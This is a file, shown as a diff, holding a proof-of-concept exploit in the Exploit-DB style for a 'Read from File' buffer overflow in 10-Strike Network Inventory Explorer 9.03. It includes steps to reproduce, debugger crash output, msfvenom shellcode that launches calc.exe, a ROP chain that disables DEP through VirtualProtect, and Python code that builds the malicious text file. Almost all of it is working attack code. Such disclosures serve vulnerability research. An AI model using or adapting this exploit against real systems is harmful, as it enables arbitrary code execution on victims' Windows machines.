@@ -1,0 +1,141 @@
+# Exploit Title: 10-Strike Network Inventory Explorer 9.03 - 'Read from File' Buffer Overflow (SEH)(ROP)
+# Date: 2020-03-30
+# Exploit Author:   Hodorsec
+# Version: 9.03
+# Software Link:    https://www.10-strike.com/networkinventoryexplorer/network-inventory-setup.exe
+# Vendor Homepage:  https://www.10-strike.com
+# Tested on:        Win8.1 x64 - Build 9600
+
+# Description:      
+# - Exploits the functionality to load a list of computers from a file
+# - Some DLL's and the main EXE don't rebase, which allowed for some instruction reusage for ROP
+# - Used a jump after ROP to go to a buffer for more space
+
+# Reproduction:
+# - Run the script, a TXT file will be generated
+# - Open the program and click on tab "Computers"
+# - Click the button "From Text File" and select the generated TXT file
+# - Clck OK and check results
+
+# WinDBG initial crash output:
+# (f54.f48): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files (x86)\10-Strike Network Inventory Explorer\NetworkInventoryExplorer.exe
+# eax=000013d3 ebx=0018f778 ecx=000002e4 edx=0018f7c0 esi=08fd8d8c edi=00190000
+# eip=00402b47 esp=0018f6e4 ebp=0018f73c iopl=0         nv up ei pl nz na po cy
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210203
+# NetworkInventoryExplorer+0x2b47:
+# 00402b47 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+# 0:000> g
+# (f54.f48): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=0018f700 ebx=00420244 ecx=00000002 edx=08fd854c esi=0048b11c edi=08f4f388
+# eip=41414141 esp=0018f8dc ebp=41414141 iopl=0         nv up ei pl nz na po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
+# 41414141 ??              ???
+
+
+#!/usr/bin/python
+
+import sys, struct
+
+filename = "poc_10_strike_nie.txt"
+
+# Maximum length
+maxlen = 5000
+
+# Offsets
+crash_esi = 2145                                                # Initial space until ESI buffer filling
+crash_seh = 217                                                 # SEH
+crash_nseh = crash_seh - 4                                      # NSEH
+landingpad = 310                                                # Space for RET NOP landingpad after stackpivoting
+
+# Shellcode
+# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b "\x0a\x0d\x00\x5c\x3a" exitfunc=thread
+# Payload size: 220 bytes
+shellcode =  b""
+shellcode += b"\xda\xdb\xd9\x74\x24\xf4\x5f\x2b\xc9\xbd\x06"
+shellcode += b"\xa7\x5d\x4b\xb1\x31\x83\xef\xfc\x31\x6f\x14"
+shellcode += b"\x03\x6f\x12\x45\xa8\xb7\xf2\x0b\x53\x48\x02"
+shellcode += b"\x6c\xdd\xad\x33\xac\xb9\xa6\x63\x1c\xc9\xeb"
+shellcode += b"\x8f\xd7\x9f\x1f\x04\x95\x37\x2f\xad\x10\x6e"
+shellcode += b"\x1e\x2e\x08\x52\x01\xac\x53\x87\xe1\x8d\x9b"
+shellcode += b"\xda\xe0\xca\xc6\x17\xb0\x83\x8d\x8a\x25\xa0"
+shellcode += b"\xd8\x16\xcd\xfa\xcd\x1e\x32\x4a\xef\x0f\xe5"
+shellcode += b"\xc1\xb6\x8f\x07\x06\xc3\x99\x1f\x4b\xee\x50"
+shellcode += b"\xab\xbf\x84\x62\x7d\x8e\x65\xc8\x40\x3f\x94"
+shellcode += b"\x10\x84\x87\x47\x67\xfc\xf4\xfa\x70\x3b\x87"
+shellcode += b"\x20\xf4\xd8\x2f\xa2\xae\x04\xce\x67\x28\xce"
+shellcode += b"\xdc\xcc\x3e\x88\xc0\xd3\x93\xa2\xfc\x58\x12"
+shellcode += b"\x65\x75\x1a\x31\xa1\xde\xf8\x58\xf0\xba\xaf"
+shellcode += b"\x65\xe2\x65\x0f\xc0\x68\x8b\x44\x79\x33\xc1"
+shellcode += b"\x9b\x0f\x49\xa7\x9c\x0f\x52\x97\xf4\x3e\xd9"
+shellcode += b"\x78\x82\xbe\x08\x3d\x6c\x5d\x99\x4b\x05\xf8"
+shellcode += b"\x48\xf6\x48\xfb\xa6\x34\x75\x78\x43\xc4\x82"
+shellcode += b"\x60\x26\xc1\xcf\x26\xda\xbb\x40\xc3\xdc\x68"
+shellcode += b"\x60\xc6\xbe\xef\xf2\x8a\x6e\x8a\x72\x28\x6f"
+
+# ROP chain
+def create_rop_chain():
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x7c344efe,  # POP EDX # RETN [MSVCR71.dll] 
+      0x61e9b30c,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
+      0x010283e5,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [NetworkInventoryExplorer.exe] 
+      0x010296a1,  # XCHG EAX,ESI # ADD AL,BYTE PTR DS:[ECX] # RETN [NetworkInventoryExplorer.exe] 
+      0x61e7555f,  # POP EBP # RETN [sqlite3.dll] 
+      0x61e63eaf,  # & push esp # ret 0x04 [sqlite3.dll]
+      0x7c37678f,  # POP EAX # RETN [MSVCR71.dll] 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x7c34d749,  # NEG EAX # RETN [MSVCR71.dll] 
+      0x0102a8a0,  # POP EBX # RETN [NetworkInventoryExplorer.exe] 
+      0xffffffff,  #  
+      0x61e0579d,  # INC EBX # RETN [sqlite3.dll] 
+      0x0102104a,  # ADD EBX,EAX # RETN [NetworkInventoryExplorer.exe] 
+      0x7c3458e6,  # POP EDX # RETN [MSVCR71.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x7c351eb1,  # NEG EDX # RETN [MSVCR71.dll] 
+      0x7c369c4a,  # POP ECX # RETN [MSVCR71.dll] 
+      0x7c38dfd7,  # &Writable location [MSVCR71.dll]
+      0x7c34a40e,  # POP EDI # RETN [MSVCR71.dll] 
+      0x0101da30,  # RETN (ROP NOP) [NetworkInventoryExplorer.exe]
+      0x01014218,  # POP EAX # RETN [NetworkInventoryExplorer.exe] 
+      0x90909090,  # nop
+      0x01014244,  # PUSHAD # RETN [NetworkInventoryExplorer.exe] 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+rop_chain = create_rop_chain()
+
+# NOPPING
+retnop = struct.pack("<L", 0x61e0103e)                          # RET # sqlite3.dll
+prenop = "\x90" * 200                                           # Pre NOP's after jumping back in stack, sledding until shellcode
+postnop = "\x90" * 16                                           # Post NOP's after running ROP chain to disable DEP
+
+# Jump back on stack for payload space
+jmpback = "\xe9\x9f\xf9\xff\xff"                                # jmp 0xfffff9a4 # Jump back on stack for more space
+
+# Prefix
+prefix = "A" * crash_nseh                                       # Junk until NSEH
+nseh = "B" * 4                                                  # Junk again, no use for NSEH
+seh = struct.pack("<L", 0x0101ce0b)                             # ADD ESP,0BDC # RETN 0x0C    ** [NetworkInventoryExplorer.exe] ** # Stackpivot
+suffix = prenop                                                 # Prenopping until shellcode
+suffix += shellcode                                             # Magic!
+suffix += retnop * landingpad                                   # RET NOP as a landingpad after stackpivot, still having DEP enabled
+suffix += rop_chain                                             # Disable DEP
+suffix += postnop                                               # Old school NOP-sledding
+suffix += jmpback                                               # Jump! Just like van Halen
+suffix += "C" * (maxlen - len(prefix + nseh + seh + suffix))    # Junk for filling
+
+# Concatenate string for payload
+payload = prefix + nseh + seh + suffix                          # Put it all together
+
+try:
+    file = open(filename,"wb")
+    file.write(payload)
+    file.close()
+    print "[+] File " + filename + " with size " + str(len(payload)) + " created successfully"
+except:
+    print "[!] Error creating file!"
+    sys.exit(0)
